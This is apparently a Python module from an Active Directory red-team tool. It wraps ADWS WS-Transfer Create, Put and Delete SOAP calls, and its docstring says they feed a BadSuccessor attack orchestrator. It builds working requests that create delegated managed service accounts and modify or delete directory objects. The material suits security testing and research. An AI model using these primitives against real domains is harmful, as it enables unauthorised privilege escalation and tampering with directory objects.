"""WS-Transfer write primitives (Create, Put, Delete) for ADWS.

Scope:
    Thin wrappers around the SOAP WS-Transfer verbs that mutate directory
    objects via the Resource / ResourceFactory endpoints on net.tcp:9389.
    These primitives are deliberately generic: they do not know anything
    about dMSA, BadSuccessor or any specific attribute. The orchestrator
    in ``soaphound.attacks.badsuccessor`` composes them.

Design decisions (v1.5.0):
    * ``ws_transfer_put`` is a thin wrapper around ``ADWSConnect.put``
      (which uses ``LDAP_PUT_FSTRING``). No new template is introduced
      and no parallel implementation is kept; the attack re-uses the
      existing Put primitive so bug fixes in ``ADWSConnect.put`` apply
      uniformly.
    * ``ws_transfer_create`` and ``ws_transfer_delete`` are genuinely
      new code paths — no equivalent exists on ``ADWSConnect`` for
      either verb. They render the two new templates
      ``WS_TRANSFER_CREATE_FSTRING`` and ``WS_TRANSFER_DELETE_FSTRING``
      from ``soap_templates`` and send them through the NMF connection,
      mirroring the ``self._nmf.send(...)`` pattern used by
      ``ADWSConnect.put`` at ``adws.py:645``.
"""
import logging
import uuid

from soaphound.ad.soap_templates import (
    WS_TRANSFER_CREATE_FSTRING,
    WS_TRANSFER_DELETE_FSTRING,
)

log = logging.getLogger(__name__)


def ws_transfer_create(nmf_client, dc_fqdn, dmsa_dn, dmsa_sam):
    """
    Send a WS-Transfer Create (IdentityManagementOperation) to ADWS
    /Windows/ResourceFactory to create a dMSA. Built on the same pattern
    as SOAPy's add_computer: a plain <ad:AddRequest> is rejected by ADWS
    with ActionNotSupportedFault; the server expects a DirectoryAccess
    <AddRequest> (Dialect XPath-Level-1) under a
    <da:IdentityManagementOperation s:mustUnderstand="1"/> header, with
    attributes encoded as <AttributeTypeAndValue> entries.

    NMFConnection.send() writes the envelope and returns None; the reply
    must be read with a separate .recv() call. Same pattern as
    ADWSConnect.put at adws.py:645-646.

    Returns True on success, raises on SOAP fault.
    """
    message_id = str(uuid.uuid4())

    # Derive parent container DN and CN from the full target DN. The
    # DirectoryAccess AddRequest expects container-hierarchy-parent and
    # relativeDistinguishedName rather than a single DistinguishedName.
    rdn, _, container_dn = dmsa_dn.partition(",")
    cn = rdn.split("=", 1)[1] if rdn.lower().startswith("cn=") else rdn

    _domain_parts = [p.split("=", 1)[1] for p in container_dn.split(",") if p.strip().lower().startswith("dc=")]
    dns_domain = ".".join(_domain_parts) if _domain_parts else "local"

    attrs = {
        "addata:objectClass": ["msDS-DelegatedManagedServiceAccount"],
        "ad:container-hierarchy-parent": [container_dn],
        "ad:relativeDistinguishedName": [f"CN={cn}"],
        "addata:sAMAccountName": [dmsa_sam],
        "addata:userAccountControl": ["4096"],
        "addata:dNSHostName": [f"{cn}.{dns_domain}"],
        "addata:msDS-ManagedPasswordInterval": ["30"],
        "addata:msDS-DelegatedMSAState": ["0"],
    }

    atav_xml = ""
    for attr_type, values in attrs.items():
        values_xml = ""
        for v in values:
            values_xml += f'<ad:value xsi:type="xsd:string">{v}</ad:value>'
        atav_xml += (
            "      <AttributeTypeAndValue>\n"
            f"        <AttributeType>{attr_type}</AttributeType>\n"
            f"        <AttributeValue>\n          {values_xml}\n        </AttributeValue>\n"
            "      </AttributeTypeAndValue>\n"
        )

    payload = WS_TRANSFER_CREATE_FSTRING.format(
        dc_fqdn=dc_fqdn,
        message_id=message_id,
        atav_xml=atav_xml,
    )
    log.debug("ws_transfer_create -> %s", dmsa_dn)
    nmf_client.send(payload)
    response = nmf_client.recv()
    _raise_on_soap_fault(response, op="Create", target=dmsa_dn)
    return True


def ws_transfer_put(adws_connect, target_dn, attribute_name, attribute_value):
    """
    Thin wrapper around ADWSConnect.put() (which uses LDAP_PUT_FSTRING).
    No new template needed - the attack re-uses the existing Put primitive.
    """
    log.debug("ws_transfer_put -> %s.%s = %s", target_dn, attribute_name, attribute_value)
    return adws_connect.put(target_dn, "replace", attribute_name, "string", attribute_value)


def ws_transfer_delete(nmf_client, dc_fqdn, target_dn):
    """
    Send a WS-Transfer Delete to ADWS /Windows/Resource. Real new code -
    ADWSConnect does not expose a .delete() method today, so we go direct
    via the NMF connection.

    Same send/recv split as ws_transfer_create: NMFConnection.send()
    returns None, the reply must be read with .recv().
    """
    message_id = str(uuid.uuid4())
    payload = WS_TRANSFER_DELETE_FSTRING.format(
        dc_fqdn=dc_fqdn,
        target_dn=target_dn,
        message_id=message_id,
    )
    log.debug("ws_transfer_delete -> %s", target_dn)
    nmf_client.send(payload)
    response = nmf_client.recv()
    _raise_on_soap_fault(response, op="Delete", target=target_dn)
    return True


def _raise_on_soap_fault(response, op, target):
    """
    Parse a SOAP response and raise a descriptive exception on fault.
    Catches 'insufficientAccessRights' explicitly so the orchestrator
    can emit a dedicated message.
    """
    if response is None:
        raise RuntimeError(f"{op} on {target}: empty response from DC")
    text = response if isinstance(response, str) else str(response)
    if "AccessDenied" in text or "INSUFF_ACCESS_RIGHTS" in text or "insufficientAccessRights" in text or "0x80072098" in text:
        raise PermissionError(f"insufficientAccessRights: {op} on {target}")
    if "NO_OBJECT" in text or "DestinationUnreachable" in text or "object does not exist" in text:
        raise FileNotFoundError(f"{op} on {target}: object does not exist")
    if "<s:Fault" in text or "<Fault" in text:
        raise RuntimeError(f"{op} on {target}: SOAP fault — {text}")
    return True
